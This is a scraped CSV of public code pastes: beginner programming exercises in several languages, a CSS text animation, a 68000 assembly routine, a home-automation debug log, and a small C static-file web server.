id,title,username,language,date,content
vCNCBTrr,lesson-2-text-animation,Patrikrizek,HTML,Friday 10th of November 2023 04:15:05 AM CDT,"
<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>3D Text on Hover Animation</title>
    <style>
        * {
            font-family: Arial, Helvetica, sans-serif;
            font-style: normal;
            font-weight: normal;
        }

        body {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #8357eb;
            width: 100vh;
            height: 100vh;
        }

        p {
            transition: all 0.5s;
            -webkit-text-stroke: 4px #36f4f4;
            font-variation-settings: ""wght"" 900, ""ital"" 1;
            font-size: 15rem;
            text-align: center;
            color: transparent;
            font-family: Arial, Helvetica, sans-serif;
            text-shadow: 10px 10px 0px #87bccc,
                15px 15px 0px #e601c8,
                20px 20px 0px #e9019a,
                25px 25px 0px #f40468,
                45px 45px 10px #482896;
            cursor: pointer;
        }

        p:hover {
            font-variation-settings: ""wght"" 900, ""ital"" 1;
            text-shadow: none;
        }
    </style>
</head>

<body>
    <p>LINE</p>
</body>

</html>"
p6PpsHnY,Untitled,tuomasvaltanen,Python,Friday 10th of November 2023 04:11:38 AM CDT,"# Introduction to programming, 10.11.2023
print(""Welcome!"")"
0VCrugi2,array && sort,egogoboy,Java,Friday 10th of November 2023 04:05:53 AM CDT,"import java.util.*;
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException {
        actions input = new actions();
        array mass = new array();
        mass.notCreated();
        Sort sort = new Sort();
        displayHello();
        do {
            input.userInput();
            switch (input.getAns()) {
                case (""manual"") : input.displayManual(); break;
                case (""new array"") :
                    if (mass.getStatus()) {
                        input.arrayIsAlreadyCreated();
                        input.userInput();
                        while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                            input.userInput();
                            input.displayError();
                        }
                        if (input.getAns().equals(""n""))
                            break;
                    }
                    mass = new array();
                    mass.createArray();
                break;
                case (""set array name""): mass.setName(); break;
                case (""set array size""): mass.setSize(); break;
                case (""set array""): mass.setElements(); break;
                case (""view array""): mass.displayArray(); break;
                case (""start sort""):
                    sort.insertionSort(mass); break;
                default : if (!input.getAns().equals(""exit""))
                            input.displayError();
                break;
            }
        } while (!input.getAns().equals(""exit""));

    }
    static void displayHello() {
        System.out.print(""Welcome to my first project!\nIf you want to see manual, enter 'manual'\n"" +
                ""If you want to exit, enter 'exit'\n"");
    }
}

class actions {
    static String user;
    {
        System.out.print(""user actions is ready to use\n"");
    }
    public void userInput(){
        Scanner in = new Scanner(System.in);
        System.out.print(""> "");
        user = in.nextLine();
    }
    public String getAns(){
        return this.user;
    }
    public void displayError() {
        System.out.print(""Unknown command X(\n"");
    }
    public void arrayIsAlreadyCreated() {
        System.out.print(""The array has already been created. Do you want to delete the current array and create a new one?[y/n]\n"");
    }
    public void displayManual() {
        System.out.print(""-----Manual-----\n"" +
                ""new array : deletes the old array and creates a completely new one\n"" +
                ""set array name : sets the name of the current array\n"" +
                ""set array size : sets the size of the current array (this will destroy all the elements!)\n"" +
                ""set array : set array elements\n"" +
                ""view array : outputs the contents of the current array\n"" +
                ""start sort : starts sorting the array\n"" +
                ""exit : breaks the program\n"");
    }
}
class Sort {
    static Scanner in = new Scanner(System.in);
    public static void insertionSort(array m) throws IOException{
        System.out.print(""Enter option (>, <): "");
        String option = in.next();
        while (!option.equals("">"") && !option.equals(""<"") && !option.equals("">="") && !option.equals(""<="")) {
            System.out.print(""Unknown command X(\n> "");
            option = in.next();
        }
        System.out.print(""!!!Indexing starts with 1!!!\n"");
        System.out.print(""Enter start index: "");
        int start = in.nextInt();
        System.out.print(""Enter end index: "");
        int stop = in.nextInt();
        int ind = start, temp = m.getElement(ind);
        while (ind < stop) {
            temp = m.getElement(ind);
            for (int i = ind; i >= start - 1; --i) {
                if (i == start - 1) {
                    m.changeElement(i, temp);
                } else
                    switch (option) {
                        case ("">""):
                            if (m.getElement((i - 1)) > temp) {
                                m.swapElements((i - 1), i);
                            }
                            else {
                                m.changeElement(i, temp);
                                break;
                            }
                        break;
                        case (""<""):
                            if (m.getElement((i - 1)) < temp) {
                                m.swapElements((i - 1), i);
                            }
                            else {
                                m.changeElement(i, temp);
                                break;
                            }
                        break;
                    }
            }
            ind++;
        }
        System.out.print(""Sort has been completed successfully!\n"");
    }
}
class array{
    Scanner in = new Scanner(System.in);
    static int size;
    static int[] nums;
    static String name;
    private actions input = new actions();
    static boolean created = false, elements = false;
    {
        this.size = 0;
        name = ""null"";
        created = true;
        elements = false;
        System.out.print(""array created successfully!\n"");
    }
    public void createArray() throws IOException {
        setName();
        setSize();
        nums = new int[size];
        setElements();
    }
    public void setElements() throws IOException {
        if (!elements) {
            System.out.print(""Enter new elements of "" + name + "": "");
            elements = true;
            for (int i = 0; i < size; ++i) {
                nums[i] = in.nextInt();
            }
            System.out.print(""The array has been filled successfully!\n"");
        }
        else {
            System.out.print(""The array is already filled. Do you want to fill it out again? [y/n]\n"");
            input.userInput();
            while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                input.userInput();
                input.displayError();
            }
            if (input.getAns().equals(""y"")) {
                System.out.print(""Enter new elements of "" + name + "": "");
                elements = true;
                for (int i = 0; i < size; ++i) {
                    nums[i] = in.nextInt();
                }
                System.out.print(""The array has been filled successfully!\n"");
            }
        }
    }
    public void setSize() throws IOException{
        System.out.print(""Enter new size of "" + name + "": "");
        int size = in.nextInt();
        if (this.size == 0) {
            this.size = size;
            System.out.print(""New size of array: "" + this.size + ""\n"");
        }
        else {
            System.out.print(""The size of the array has already been set. do you want to change it?"" +
                    "" (this will destroy all the elements!) [y/n]\n"");
            input.userInput();
            while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                input.userInput();
                input.displayError();
            }
            if (input.getAns().equals(""y"")) {
                this.size = size;
                elements = false;
                System.out.print(""New size of array: "" + this.size + ""\n"");
            }
        }
        nums = new int[this.size];

    }
    public void setName() throws IOException{
        System.out.print(""Enter the new name of array: "");
        String name = in.next();
        while (name.equals(""null"")) {
            System.out.print(""You cannot use this name!\nEnter the new name of array: "");
            name = in.next();
        }
        if (this.name.equals(""null"")) {
            this.name = name;
            System.out.print(""New name of array: "" + this.name + ""\n"");
        }
        else {
            System.out.print(""The array already has a name. Are you sure you want to rename it? [y/n]\n"");
            input.userInput();
            while (!input.getAns().equals(""y"") && !input.getAns().equals(""n"")) {
                input.userInput();
                input.displayError();
            }
            if (input.getAns().equals(""y"")) {
                this.name = name;
                System.out.print(""New name of mass: "" + this.name + ""\n"");
            }
        }
    }
    public int getSize() {
        return this.size;
    }
    public int getElement(int ind) {
        return nums[ind];
    }
    public boolean getStatus() {
        return created;
    }
    public int[] getArray() {
        return this.nums;
    }
    public void changeElement(int ind, int temp) {
        nums[ind] = temp;
        return;
    }
    public void swapElements(int l, int r) {
        int temp = nums[l];
        nums[l] = nums[r];
        nums[r] = temp;
        return;
    }
    public void displayArray() {
        System.out.print(""Name of array: "" + name +
                ""\nSize of array: "" + size +
                ""\nElements of array: "");
        for (int i = 0; i < size; ++i)
            System.out.print(nums[i] + "" "");
        System.out.print(""\n"");
    }
    public void notCreated() {
        created = false;
    }
}"
LwPZWt6V,02. Treasure Hunt,Spocoman,Python,Friday 10th of November 2023 03:28:55 AM CDT,"chest = input().split('|')
command = input()

while command != ""Yohoho!"":
    tokens = command.split(' ')
    command = tokens[0]
    if command == ""Loot"":
        for i in range(1, len(tokens)):
            if tokens[i] not in chest:
                chest.insert(0, tokens[i])
    elif command == ""Drop"":
        index = int(tokens[1])
        if 0 <= index < len(chest):
            chest.append(chest.pop(index))
    elif command == ""Steal"":
        count = int(tokens[1])
        stolen_chest = chest[-count:]
        chest = chest[: - count]
        print("", "".join(stolen_chest))

    command = input()

if len(chest) == 0:
    print(""Failed treasure hunt."")
else:
    average_gain = len(''.join(chest)) / len(chest)
    print(f""Average treasure gain: {average_gain:.2f} pirate credits."")
"
WLfWaCCy,EsRebecca,robyzan,C++,Friday 10th of November 2023 03:26:50 AM CDT,"#include<iostream>
using namespace std;
int main()
{
	int data1,data2;
	cout<<""scrivi una data1 con g,m,a""<<endl;
	cin>>data1;
	cout<<""scrivi una data2 con g,m,a""<<endl;
	cin>>data2;
	
	if (data1>data2)
	{
		cout<<""data piu' recente""<<endl;
	}
	else 
	cout<<""data meno recente""<<endl;
        
	return 0;
}"
M2K1TvuZ,01. Black Flag,Spocoman,Python,Friday 10th of November 2023 03:13:06 AM CDT,"days = int(input())
daily_plunder = int(input())
expected_plunder = float(input())
total_plunder = 0.0

for i in range(1, days + 1):
    total_plunder += daily_plunder
    if i % 3 == 0:
        total_plunder += daily_plunder * 0.5
    if i % 5 == 0:
        total_plunder *= 0.7

if total_plunder >= expected_plunder:
    print(f""Ahoy! {total_plunder:.2f} plunder gained."")
else:
    print(f""Collected only {total_plunder / expected_plunder * 100:.2f}% of the plunder."")
"
6Y4cuEg2,01. Black Flag,Spocoman,JavaScript,Friday 10th of November 2023 02:54:14 AM CDT,"function blackFlag(input) {
    let days = Number(input[0]);
    let dailyPlunder = Number(input[1]);
    let expectedPlunder = Number(input[2]);
    let totalPlunder = 0;

    for (let i = 1; i <= days; i++) {
        totalPlunder += dailyPlunder;
        if (i % 3 == 0) {
            totalPlunder += dailyPlunder * 0.5;
        }
        if (i % 5 == 0) {
            totalPlunder *= 0.7;
        }
    }

    if (totalPlunder >= expectedPlunder) {
        console.log(`Ahoy! ${totalPlunder.toFixed(2)} plunder gained.`);
    } else {
        console.log(`Collected only ${(totalPlunder / expectedPlunder * 100).toFixed(2)}% of the plunder.`);
    }
	return;
}"
GW7ps5Br,Leetcode course task #2722 (very cool),tankalxat34,TypeScript,Friday 10th of November 2023 02:50:47 AM CDT,"type JSONValue = null | boolean | number | string | JSONValue[] | { [key: string]: JSONValue };
type TaskObj = {
    id: number
    [key: string]: any
} | any

function join(arr1: JSONValue[] | TaskObj, arr2: JSONValue[] | TaskObj): JSONValue[] {
    const result: any = {};

    for (let obj of arr1) {
        result[obj.id] = obj;
    }

    for (let obj of arr2) {
        if (result[obj.id]) {
            for (let key in obj) {
                result[obj.id][key] = obj[key];
            }
        } else {
            result[obj.id] = obj;
        }
    }

    return Object.values(result) as JSONValue[];
};"
UmYMHJjy,01. Black Flag,Spocoman,C++,Friday 10th of November 2023 02:48:24 AM CDT,"#include <iostream>
#include<iomanip>

using namespace std;

int main() {
    int days, dailyPlunder;
    cin >> days >> dailyPlunder;

    double expectedPlunder, totalPlunder = 0;
    cin >> expectedPlunder;

    for (int i = 1; i <= days; i++) {
        totalPlunder += dailyPlunder;
        if (i % 3 == 0) {
            totalPlunder += dailyPlunder * 0.5;
        }
        if (i % 5 == 0) {
            totalPlunder *= 0.7;
        }
    }

    if (totalPlunder >= expectedPlunder) {
        cout << ""Ahoy! "" << fixed << setprecision(2) << totalPlunder << "" plunder gained.\n"";
    }
    else {
        double percentage = totalPlunder / expectedPlunder * 100;
        cout << ""Collected only "" << fixed << setprecision(2) << percentage << ""% of the plunder.\n"";
    }
    return 0;
}"
X3BDQxtQ,01. Black Flag,Spocoman,C#,Friday 10th of November 2023 02:35:08 AM CDT,"using System;

namespace BlackFlag
{
    class Program
    {
        static void Main(string[] args)
        {
            int days = int.Parse(Console.ReadLine());
            int dailyPlunder = int.Parse(Console.ReadLine());
            double expectedPlunder = double.Parse(Console.ReadLine());
            double totalPlunder = 0;

            for (int i = 1; i <= days; i++)
            {
                totalPlunder += dailyPlunder;
                if (i % 3 == 0)
                {
                    totalPlunder += dailyPlunder * 0.5;
                }
                if (i % 5 == 0)
                {
                    totalPlunder *= 0.7;
                }
            }

            if (totalPlunder >= expectedPlunder)
            {
                Console.WriteLine($""Ahoy! {totalPlunder:f2} plunder gained."");
            }
            else
            {
                double percentage = totalPlunder / expectedPlunder * 100;
                Console.WriteLine($""Collected only {percentage:f2}% of the plunder."");
            }
        }
    }
}
"
wjUzQqzu,Leetcode course task #2722 (by spread approach),tankalxat34,TypeScript,Friday 10th of November 2023 02:24:23 AM CDT,"type JSONValue = null | boolean | number | string | JSONValue[] | { [key: string]: JSONValue };
type TaskValue = {
    id: number;
    [key: string]: any;
} | JSONValue | JSONValue[] | { [key: string]: any } | any;

function join(arr1: JSONValue[], arr2: JSONValue[]): JSONValue[] {
    let merged: JSONValue[] = [...arr1, ...arr2];
    let ids = merged.map((value: TaskValue) => value.id);
    let tmp: { [key: number]: Object } = {};

    for (let i: number = 0; i < ids.length; i++) {
        const id: number = ids[i];
        const obj: TaskValue = merged[i];

        if (typeof tmp[id] !== ""object"") {
            tmp[id] = {
                ...(obj as Object),
            };
        } else {
            tmp[id] = {
                ...(tmp[id] as Object),
                ...(obj as Object),
            };
        }
    }

    return Object.values(tmp) as JSONValue[];
}
"
WcZr5rCL,not yet tested contigus routine,glokyfull,Motorola 68000 HiSoft Dev,Friday 10th of November 2023 02:11:25 AM CDT,"
createContigustable
;
; a0 = ram
; d0 = nombre d'element de la table sinus
; d1 = pas interne
; d2 = nombre de copie de valeurs
; a3 = table de sinus d'amplitude final
;
; pendant le fonctionnement:
; constante  d3,d4,d5 = pas interne,*2,*4
;

; retour:
; a0 = ram
; a1 = adresse table de d0 adresses  reftable pris a partir de la ram
;  


	move.l a0,a1		; a1 = table refsin
	move.w d0,d3
	add.w d3,d3		; *2
	move.l a3,a4
	add d3,a4
	add.w d3,d3		; *4
	add.w d3,a0			; a0 =ram
	
	move.l a3,a4


	lea tempbuffer,a2
	move.w d0,d4
	lsr #2,d4
	moveq #0,d3
.clearFlag
	move.l d3,(a2)+
	dbf d4,.clearFlag	; +- 4 octet

	lea tempbuffer,a2
	move.l a2,a5
	add.w d0,a5
	add.w d0,a5			; a5 = fin tempbuffer


	;moveq #0,d5			; angle
	
	move.w d1,d3		; pas interne<>0
	move.w d3,d4
	add d4,d4			; pas interne*2
	move.w d4,d5
	add.w d5,d5			; pas interne*4
	neg.w d0
	move.w d0,.auto1+2			; nombre d'elements
	add.w d0,d0
	move.w d0,.auto2+2
	move.w d0,.auto2b+2
	add.w d0,d0
	move.w d0,.auto3+2
;----------------------------------------
.loop
	move.w (a3),d7
	tst.b (a2)
	bne.s .flaga1
	st.b (a2)
	move.l a0,(a1)		; on stoque l'adresse de la valeur dans table refsin
	move.w d7,(a0)+
	; on met a jour a3 avec le pas interne*2
	; on met a jour a2 avec le pas interne (flags)
	add.w d3,a2
	add.w d4,a3
	add.w d5,a1

	cmp.l a2,a5
	blt.s .loop
.auto1
	lea 0(a2),a2
.auto2
	lea 0(a3),a3
.auto3
	lea 0(a1),a1
	bra.s .loop
.flaga1
	move.w d2,d6		; nombre de copie
	subq.w #1,d6

	move.l a3,-(sp)
.cpy
	move.w d7,(a0)+
	add.w d4,a3
	cmp.l a3,a4
	blt.s .1
.auto2b
	lea 0(a3),a3

.1
	move.w (a3),d7
	dbf d6,.cpy
	move.l (sp)+,a3

	addq.w #1,a2
	addq.w #2,a3
	addq.w #4,a1
	tst.b (a2)
	bne.s .fin
	bra.s .loop
.fin
	rts	
	BSS

	even
tempbuffer
	ds.w 4096 ; max 8192 elements
	ds.l 1

"
N1GSrXtU,Untitled,chemelli74,Python,Friday 10th of November 2023 02:03:32 AM CDT,"
2023-11-09 20:33:01.967 DEBUG (MainThread) [aiocomelit] GET page /user/action.cgi?type=light&num1=8 [192.168.1.252:80]

2023-11-09 20:33:02.622 DEBUG (MainThread) [aiocomelit] GET response 1 [192.168.1.252:80]

2023-11-09 20:33:02.690 DEBUG (MainThread) [aiocomelit] List of devices of type light: {'num': 25, 'desc': ['Disimpegno Muretto', 'Disimpegno Ingresso', 'Sala Zona Pranzo', 'Sala Zona Giorno', 'Cucina Zona Tavolo', 'Cucina Zona Lavello', 'Cucina Zona Fornelli', 'Cucina Zona Frigo', 'Studio', 'Camera Natalia', 'Camera Axel &amp; Arazka', 'Camera Matrimoniale', 'Bagno Servizio', 'Bagno Bimbi', 'Bagno Matrimoniale', 'Disimpegno Bagno Ser', 'Disimpegno Scale', 'Disimpegno Matrimoni', 'Scale', 'Fronte Casa', 'Retro Casa', 'Fari Tettoia', 'Auto/Ambient', 'Balcone Frontale', 'Balcone Retro'], 'env': [1, 1, 2, 2, 3, 3, 3, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 15, 16, 16, 17, 18], 'status': [0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0], 'val': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], 'type': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0], 'protected': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], 'env_desc': ['', 'Ingresso', 'Sala', 'Cucina', 'Studio', 'Camera Natalia', 'Camera Axel &amp; Arazka', 'Camera Matrimoniale', 'Bagno Servizio', 'Bagno Bimbi', 'Bagno Matrimoniale', 'Disimpegno Bagno Ser', 'Disimpegno Scale', 'Disimpegno Matrimoni', 'Scale', 'Esterno', 'Tettoia Garage', 'Balcone Frontale', 'Balcone Retro', 'Locale Tecnico']}

"
VYmZkVE8,Untitled,RocknRollGlue,C#,Friday 10th of November 2023 02:02:09 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
 
namespace KrydsOgBolle
{
    class KrydsOgBolle
    {
        char[] board = new char[9] { '1', '2', '3', '4', '5', '6','7', '8', '9'};
        static void Main(string[] args)
        {
            //Lav et program, der opretter et 3 x 3 array og bed brugeren om at vælge en celle og værdi [X eller O]
            //Udlæs derefter arrayet korrekt
 
            string player1 = ""X"", player2 = ""O"";
 
            Console.Write(""Player 1, please write your name: "");
            player1 = Console.ReadLine();
            Console.Write(""Player 2, please write your name: "");
            player2 = Console.ReadLine();
            PrintBoard();
        }

        static void PrintBoard(){
            Console.WriteLine(""     |     |     "");
            Console.WriteLine(""   {0} |  {1} | {2}"", board[1], board[2], board[3]);
            Console.WriteLine(""     |     |     "");
            Console.WriteLine(""   {0} |  {1} | {2}"", board[4], board[5], board[6]);
            Console.WriteLine(""     |     |     "");
            Console.WriteLine(""   {0} |  {1} | {2}"", board[7], board[8], board[9]);
            Console.WriteLine(""     |     |     "");

        }


    }
}
 "
uBHwVYUd,Untitled,RocknRollGlue,C#,Friday 10th of November 2023 02:00:36 AM CDT,"
static void PrintBoard(){
    char[] board = new char[9] { '1', '2', '3', '4', '5', '6','7', '8', '9'};
    Console.WriteLine(""     |     |     "");
    Console.WriteLine(""   {0} |  {1} | {2}"", board[1], board[2], board[3]);
    Console.WriteLine(""     |     |     "");
    Console.WriteLine(""   {0} |  {1} | {2}"", board[4], board[5], board[6]);
    Console.WriteLine(""     |     |     "");
    Console.WriteLine(""   {0} |  {1} | {2}"", board[7], board[8], board[9]);
    Console.WriteLine(""     |     |     "");

}"
1Cnx7wmW,WEB server,opencard,C,Friday 10th of November 2023 01:33:15 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define VERSION 23
#define BUFSIZE 8096
#define ERROR      42
#define LOG        44
#define FORBIDDEN 403
#define NOTFOUND  404

struct {
    char *ext;
    char *filetype;
} extensions [] = {
    {""gif"", ""image/gif"" },  
    {""jpg"", ""image/jpg"" }, 
    {""jpeg"",""image/jpeg""},
    {""png"", ""image/png"" },  
    {""ico"", ""image/ico"" },  
    {""zip"", ""image/zip"" },  
    {""gz"",  ""image/gz""  },  
    {""tar"", ""image/tar"" },  
    {""htm"", ""text/html"" },  
    {""html"",""text/html"" },  
    {""json"",""application/json"" },  
    {0,0} };

void logger(int type, char *s1, char *s2, int socket_fd)
{
    int fd ;
    char logbuffer[BUFSIZE*2];

    switch (type) {
    case ERROR: (void)sprintf(logbuffer,""ERROR: %s:%s Errno=%d exiting pid=%d"",s1, s2, errno,getpid()); 
        break;
    case FORBIDDEN: 
        (void)write(socket_fd, ""HTTP/1.1 403 Forbidden\nContent-Length: 185\nConnection: close\nContent-Type: text/html\n\n<html><head>\n<title>403 Forbidden</title>\n</head><body>\n<h1>Forbidden</h1>\nThe requested URL, file type or operation is not allowed on this simple static file webserver.\n</body></html>\n"",271);
        (void)sprintf(logbuffer,""FORBIDDEN: %s:%s"",s1, s2); 
        break;
    case NOTFOUND: 
        (void)write(socket_fd, ""HTTP/1.1 404 Not Found\nContent-Length: 136\nConnection: close\nContent-Type: text/html\n\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\nThe requested URL was not found on this server.\n</body></html>\n"",224);
        (void)sprintf(logbuffer,""NOT FOUND: %s:%s"",s1, s2); 
        break;
    case LOG: (void)sprintf(logbuffer,"" INFO: %s:%s:%d"",s1, s2,socket_fd); break;
    }
    if((fd = open(""web.log"", O_CREAT| O_WRONLY | O_APPEND,0644)) >= 0) {
        (void)write(fd,logbuffer,strlen(logbuffer)); 
        (void)write(fd,""\n"",1);      
        (void)close(fd);
    }
    if(type == ERROR || type == NOTFOUND || type == FORBIDDEN) exit(3);
}

void web(int fd, int hit)
{
    int j, file_fd, buflen;
    long i, ret, len;
    char * fstr;
    static char buffer[BUFSIZE+1];

    ret =read(fd,buffer,BUFSIZE);
    if(ret == 0 || ret == -1) {
        logger(FORBIDDEN,""failed to read browser request"","""",fd);
    }
    if(ret > 0 && ret < BUFSIZE)
        buffer[ret]=0;
    else buffer[0]=0;
    for(i=0;i<ret;i++)
        if(buffer[i] == '\r' || buffer[i] == '\n')
            buffer[i]='*';
    logger(LOG,""request"",buffer,hit);
    if( strncmp(buffer,""GET "",4) && strncmp(buffer,""get "",4) ) {
        logger(FORBIDDEN,""Only simple GET operation supported"",buffer,fd);
    }
    for(i=4;i<BUFSIZE;i++) {
        if(buffer[i] == ' ') {
            buffer[i] = 0;
            break;
        }
    }
    for(j=0;j<i-1;j++)
        if(buffer[j] == '.' && buffer[j+1] == '.') {
            logger(FORBIDDEN,""Parent directory (..) path names not supported"",buffer,fd);
        }
    if( !strncmp(&buffer[0],""GET /\0"",6) || !strncmp(&buffer[0],""get /\0"",6) )
        (void)strcpy(buffer,""GET /index.html"");
    buflen=strlen(buffer);
    fstr = (char *)0;
    for(i=0;extensions[i].ext != 0;i++) {
        len = strlen(extensions[i].ext);
        if( !strncmp(&buffer[buflen-len], extensions[i].ext, len)) {
            fstr =extensions[i].filetype;
            break;
        }
    }
    if(fstr == 0) logger(FORBIDDEN,""file extension type not supported"",buffer,fd);

    if(( file_fd = open(&buffer[5],O_RDONLY)) == -1) {
        logger(NOTFOUND, ""failed to open file"",&buffer[5],fd);
    }
    logger(LOG,""SEND"",&buffer[5],hit);
    len = (long)lseek(file_fd, (off_t)0, SEEK_END);
          (void)lseek(file_fd, (off_t)0, SEEK_SET);
          (void)sprintf(buffer,""HTTP/1.1 200 OK\nServer: web/%d.0\nContent-Length: %ld\nConnection: close\nContent-Type: %s\n\n"", VERSION, len, fstr);
    logger(LOG,""Header"",buffer,hit);
    (void)write(fd,buffer,strlen(buffer));
    while (    (ret = read(file_fd, buffer, BUFSIZE)) > 0 ) {
        (void)write(fd,buffer,ret);
    }
    sleep(1);
    close(fd);
    exit(1);
}

int main(int argc, char **argv)
{
    int i, port, pid, listenfd, socketfd, hit;
    socklen_t length;
    static struct sockaddr_in cli_addr;
    static struct sockaddr_in serv_addr;

    if( argc < 3  || argc > 3 || !strcmp(argv[1], ""-?"") ) {
        (void)printf(""V: "", VERSION);
        for(i=0;extensions[i].ext != 0;i++)
            (void)printf("" %s"",extensions[i].ext);

        (void)printf(""\n\tNot Supported"");
        exit(0);
    }
    if( !strncmp(argv[2],""/""   ,2 ) || !strncmp(argv[2],""/etc"", 5 ) ||
        !strncmp(argv[2],""/bin"",5 ) || !strncmp(argv[2],""/lib"", 5 ) ||
        !strncmp(argv[2],""/tmp"",5 ) || !strncmp(argv[2],""/usr"", 5 ) ||
        !strncmp(argv[2],""/dev"",5 ) || !strncmp(argv[2],""/sbin"",6) ){
        (void)printf(""ERROR: Bad top directory %s, see web -?\n"",argv[2]);
        exit(3);
    }
    if(chdir(argv[2]) == -1){ 
        (void)printf(""ERROR: Can't Change to directory %s\n"",argv[2]);
        exit(4);
    }
    if(fork() != 0)
        return 0;
    (void)signal(SIGCHLD, SIG_IGN);
    (void)signal(SIGHUP, SIG_IGN);
    for(i=0;i<32;i++)
        (void)close(i);
    (void)setpgrp();
    logger(LOG,""web starting"",argv[1],getpid());
    if((listenfd = socket(AF_INET, SOCK_STREAM,0)) <0)
        logger(ERROR, ""system call"",""socket"",0);
    port = atoi(argv[1]);
    if(port < 0 || port >60000)
        logger(ERROR,""Invalid port number (try 1->60000)"",argv[1],0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(port);
    if(bind(listenfd, (struct sockaddr *)&serv_addr,sizeof(serv_addr)) <0)
        logger(ERROR,""system call"",""bind"",0);
    if( listen(listenfd,64) <0)
        logger(ERROR,""system call"",""listen"",0);
    for(hit=1; ;hit++) {
        length = sizeof(cli_addr);
        if((socketfd = accept(listenfd, (struct sockaddr *)&cli_addr, &length)) < 0)
            logger(ERROR,""system call"",""accept"",0);
        if((pid = fork()) < 0) {
            logger(ERROR,""system call"",""fork"",0);
        }
        else {
            if(pid == 0) {
                (void)close(listenfd);
                web(socketfd,hit);
            } else {
                (void)close(socketfd);
            }
        }
    }
}
//~ gcc -O -DLINUX web.c -o web
"
